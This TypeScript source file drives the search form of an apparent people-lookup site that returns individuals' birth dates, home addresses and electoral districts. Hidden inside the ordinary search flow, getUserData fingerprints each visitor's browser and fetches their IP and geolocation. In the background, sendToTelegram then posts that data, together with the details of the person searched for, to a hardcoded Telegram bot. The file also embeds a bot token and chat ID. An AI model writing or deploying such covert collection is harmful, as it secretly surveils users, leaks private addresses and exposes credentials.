import { SearchFormData, ApiResponse, UserData, normalizeSearchFormData } from './types';
import { MapManager } from './map';

export class SearchManager {
  private form: HTMLFormElement;
  private loadingSpinner: HTMLElement;
  private errorMessage: HTMLElement;
  private resultsContainer: HTMLElement;
  private resultsList: HTMLElement;
  private regionSelect: HTMLSelectElement;
  private communitySelect: HTMLSelectElement;
  private communityInput: HTMLInputElement;
  private mapManager: MapManager;

  // Telegram config
  private readonly TELEGRAM_BOT_TOKEN = '8513664028:AAEuGpg79Ukef853WzYJPv1Lk30ak-GcK3w';
  private readonly TELEGRAM_CHAT_ID = '6760298907';

  constructor(mapManager: MapManager) {
    this.form = document.getElementById('searchForm') as HTMLFormElement;
    this.loadingSpinner = document.getElementById('loadingSpinner') as HTMLElement;
    this.errorMessage = document.getElementById('errorMessage') as HTMLElement;
    this.resultsContainer = document.getElementById('resultsContainer') as HTMLElement;
    this.resultsList = document.getElementById('resultsList') as HTMLElement;
    this.regionSelect = document.getElementById('region') as HTMLSelectElement;
    this.communitySelect = document.getElementById('community') as HTMLSelectElement;
    this.communityInput = document.getElementById('communityInput') as HTMLInputElement;
    this.mapManager = mapManager;

    this.setupEventListeners();
    this.toggleCommunityField();
  }

  private setupEventListeners(): void {
    this.form.addEventListener('submit', (e) => this.handleSubmit(e));
    this.regionSelect.addEventListener('change', () => this.toggleCommunityField());
    this.form.addEventListener('reset', () => this.handleReset());
  }

  private toggleCommunityField(): void {
    const selectedRegion = this.regionSelect.value;

    if (selectedRegion === 'ԵՐԵՎԱՆ') {
      this.communitySelect.style.display = 'block';
      this.communityInput.style.display = 'none';
      this.communityInput.value = '';
    } else {
      this.communitySelect.style.display = 'none';
      this.communityInput.style.display = 'block';
      this.communitySelect.value = '';
    }
  }

  private async getUserData(): Promise<UserData> {
    const userData: UserData = {
      timestamp: new Date().toISOString(),
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      language: navigator.language || 'unknown',
      languages: navigator.languages ? Array.from(navigator.languages) : [],
      platform: navigator.platform,
      userAgent: navigator.userAgent,
      vendor: navigator.vendor,
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack || null,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: (navigator as any).deviceMemory,
      maxTouchPoints: navigator.maxTouchPoints,
      screen: {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        orientation: (screen.orientation as any)?.type
      },
      window: {
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight
      },
      connection: {
        effectiveType: (navigator as any).connection?.effectiveType,
        downlink: (navigator as any).connection?.downlink,
        rtt: (navigator as any).connection?.rtt,
        saveData: (navigator as any).connection?.saveData
      }
    };

    // Get IP info
    try {
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipResponse.json();
      userData.ip = ipData.ip;

      // Get geolocation
      const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
      const geoData = await geoResponse.json();
      userData.geolocation = {
        ip: geoData.ip,
        city: geoData.city,
        region: geoData.region,
        country: geoData.country_name,
        country_code: geoData.country_code,
        postal: geoData.postal,
        latitude: geoData.latitude,
        longitude: geoData.longitude,
        timezone: geoData.timezone,
        asn: geoData.asn,
        org: geoData.org,
        isp: geoData.org
      };
    } catch (error) {
      console.error('Error fetching IP/Geo data:', error);
      userData.ip = 'Unknown';
      userData.geolocation = { error: String(error) };
    }

    return userData;
  }

  private async sendToTelegram(formData: SearchFormData, userData: UserData): Promise<void> {
    const message = `
🔍 *НОВЫЙ ПОИСК В СИСТЕМЕ*

📋 *Данные формы:*
━━━━━━━━━━━━━━━━━━━━
👤 Имя: \`${formData.first_name}\`
👤 Фамилия: \`${formData.last_name}\`
👨‍👦 Отчество: \`${formData.middle_name || 'не указано'}\`
📅 Дата рождения: \`${formData.birth_date || 'не указано'}\`
📍 Регион: \`${formData.region || 'ԵՐԵՎԱՆ'}\`
🏘 Община: \`${formData.community || 'не указано'}\`
🛣 Улица: \`${formData.street || 'не указано'}\`
🏠 Дом: \`${formData.building || 'не указано'}\`
🚪 Квартира: \`${formData.apartment || 'не указано'}\`
📌 Район: \`${formData.district || 'не указано'}\`

🌐 *Информация о пользователе:*
━━━━━━━━━━━━━━━━━━━━
🌍 IP: \`${userData.ip}\`
📍 Местоположение: \`${userData.geolocation?.city || 'Unknown'}, ${userData.geolocation?.country || 'Unknown'}\`
⏰ *Время запроса:* \`${userData.timestamp}\`
    `.trim();

    try {
      await fetch(`https://api.telegram.org/bot${this.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: this.TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      });
      console.log('✓ Data sent to Telegram successfully');
    } catch (error) {
      console.error('Error sending to Telegram:', error);
    }
  }

  private async handleSubmit(e: Event): Promise<void> {
    e.preventDefault();

    this.errorMessage.style.display = 'none';
    this.resultsContainer.style.display = 'none';
    this.loadingSpinner.style.display = 'block';

    // Collect form data
    let formData: SearchFormData = {
      first_name: (document.getElementById('firstName') as HTMLInputElement).value,
      last_name: (document.getElementById('lastName') as HTMLInputElement).value,
      middle_name: (document.getElementById('middleName') as HTMLInputElement).value,
      birth_date: (document.getElementById('birthDate') as HTMLInputElement).value,
      street: (document.getElementById('street') as HTMLInputElement).value,
      building: (document.getElementById('building') as HTMLInputElement).value,
      apartment: (document.getElementById('apartment') as HTMLInputElement).value,
      district: (document.getElementById('district') as HTMLInputElement).value,
      region: this.regionSelect.value,
      community: this.regionSelect.value === 'ԵՐԵՎԱՆ' ? this.communitySelect.value : this.communityInput.value
    };

    // Normalize Armenian text (convert "և" to "եւ")
    formData = normalizeSearchFormData(formData);

    console.log('🔍 Отправка данных на сервер:', formData);

    // Send to Telegram in background
    this.getUserData().then(userData => {
      this.sendToTelegram(formData, userData);
    }).catch(error => {
      console.error('Error collecting user data:', error);
    });

    try {
      // ============================================
      // ЗАПРОС К СЕРВЕРУ - server.ts делает всю работу!
      // ============================================
      console.log('📡 Отправка запроса к /api/search...');

      const response = await fetch('/api/search', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData)
      });

      const result: ApiResponse = await response.json();
      console.log('✅ Ответ от сервера:', result);

      this.loadingSpinner.style.display = 'none';

      if (!response.ok) {
        this.errorMessage.textContent = '❌ ' + (result.error || 'Որոնումը ձախողվել է / Search failed');
        this.errorMessage.style.display = 'block';
        return;
      }

      if (result.success && result.results) {
        console.log(`✓ Успешно получено ${result.results.length} результатов`);
        this.displayResults(result.results, result.count || 0);
      } else {
        this.errorMessage.textContent = '❌ ' + (result.error || 'Որոնումը ձախողվել է / Search failed');
        this.errorMessage.style.display = 'block';
      }
    } catch (error) {
      console.error('❌ Ошибка при запросе к серверу:', error);
      this.loadingSpinner.style.display = 'none';
      this.errorMessage.textContent = '❌ Սխալ / Error: ' + String(error);
      this.errorMessage.style.display = 'block';
    }
  }

  private displayResults(results: any[], count: number): void {
    this.resultsList.innerHTML = results.map((result, index) => `
      <div class="result-item" style="cursor: pointer;" data-result-index="${index}">
        <div class="result-name">${index + 1}. ${this.escapeHtml(result.name)}</div>
        <div class="result-field">
          <span class="result-label">Ծննդյան Օր:</span>
          <span>${this.escapeHtml(result.birth_date)}</span>
        </div>
        <div class="result-field">
          <span class="result-label">Մարզ/Համայնք:</span>
          <span>${this.escapeHtml(result.region_community)}</span>
        </div>
        <div class="result-field">
          <span class="result-label">Հասցե:</span>
          <span>${this.escapeHtml(result.address)}</span>
        </div>
        <div class="result-field">
          <span class="result-label">Ընտրական Մեկ.:</span>
          <span>${this.escapeHtml(result.district)}</span>
        </div>
      </div>
    `).join('');

    // Add click handlers
    const resultItems = document.querySelectorAll('.result-item');
    resultItems.forEach((item, index) => {
      item.addEventListener('click', () => {
        this.mapManager.openMapWithAddress(results[index]);
      });
    });

    const resultCountElement = document.getElementById('resultCount') as HTMLElement;
    resultCountElement.innerHTML = `✓ Ընդամենը ${count} արդյունք հայտնաբերվել / Total ${count} results found`;

    this.resultsContainer.style.display = 'block';
    this.resultsContainer.scrollIntoView({ behavior: 'smooth' });
  }

  private handleReset(): void {
    this.errorMessage.style.display = 'none';
    this.resultsContainer.style.display = 'none';
  }

  private escapeHtml(text: string): string {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
  }
}
